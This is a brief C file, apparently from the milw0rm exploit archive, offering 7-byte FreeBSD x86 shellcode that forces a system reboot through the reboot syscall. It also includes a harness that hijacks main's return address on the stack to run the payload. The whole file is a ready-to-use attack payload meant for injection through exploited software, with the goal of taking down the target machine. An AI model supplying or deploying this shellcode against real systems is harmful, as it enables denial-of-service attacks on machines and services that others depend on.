/*
 *
 * FreeBSD_x86-reboot-7b.c (Shellcode, reboot(RB_AUTOBOOT), 7 bytes)
 *
 * by IZ <guerrilla.sytes.net>
 *
 */


char shellcode[] =
"\x31\xc0"                  /* xor %eax,%eax */

"\x50"                      /* push %eax */
"\xb0\x37"                  /* mov $0x37,%al */
"\xcd\x80";                 /* int $0x80 */


void main()
{
     int*     ret;

     ret = (int*) &ret + 2;

     printf("len %d\n",strlen(shellcode));

     (*ret) = (int) shellcode;
}

// milw0rm.com [2006-04-19]